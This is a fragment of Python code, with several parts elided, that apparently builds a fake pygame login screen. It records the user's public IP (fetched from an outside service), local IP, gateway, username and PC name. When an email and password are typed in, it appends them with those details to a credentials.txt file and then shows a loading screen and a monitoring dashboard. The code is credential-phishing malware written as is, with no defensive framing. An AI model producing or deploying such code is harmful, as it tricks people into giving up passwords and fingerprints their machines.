...
import getpass
import datetime
import requests  # Added to fetch real public IP
...
def get_system_info():
    try:
        # Attempt to get the real public IP address from an external service
        public_ip = requests.get("https://api.ipify.org").text  # This returns your public IP
    ...
    # Get system username and PC name
    username = getpass.getuser()
    pc_name = platform.node()

    return public_ip, local_ip, default_gateway, username, pc_name

public_ip, local_ip, default_gateway, username, pc_name = get_system_info()
...
def save_credentials(ip, password, email, username, pc_name):
    ...
    with open("credentials.txt", "a") as f:
        f.write(f"[{timestamp}] Public IP: {ip} | Local IP: {local_ip} | Default Gateway: {default_gateway} | Username: {username} | PC Name: {pc_name} | Email: {email} | Password: {password}\n")
    print(f"[+] Saved: {timestamp} Public IP={ip} Local IP={local_ip} Default Gateway={default_gateway} Username={username} PC Name={pc_name} Email={email} Password={password}")
            ...
            if event.type == pygame.KEYDOWN:
                ...
                if active_password:
                    if event.key == pygame.K_RETURN:
                        save_credentials(public_ip, text_password, text_email, username, pc_name)
                        loading_screen()
...
def pc_monitoring_dashboard():
    ...
    while running:
        ...
        gateway_text = font.render(f"Default Gateway: {default_gateway}", True, BLACK)
        screen.blit(gateway_text, (50, 250))
